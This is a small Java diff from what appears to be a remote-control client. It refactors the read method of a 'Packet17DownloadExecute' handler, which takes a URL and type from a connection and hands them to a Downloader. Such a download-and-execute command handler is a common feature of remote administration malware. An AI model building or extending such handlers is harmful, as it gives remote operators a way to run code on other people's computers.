@@ -7,9 +7,9 @@ public class Packet17DownloadExecute extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		String url = Connection.readLine();
-		String type = Connection.readLine();
-		boolean readFromSocket = Connection.readBoolean();
+		String url = Connection.instance.readLine();
+		String type = Connection.instance.readLine();
+		boolean readFromSocket = Connection.instance.readBoolean();
 		
 		if (readFromSocket) {
 			new Downloader(url, false, type, readFromSocket).run();
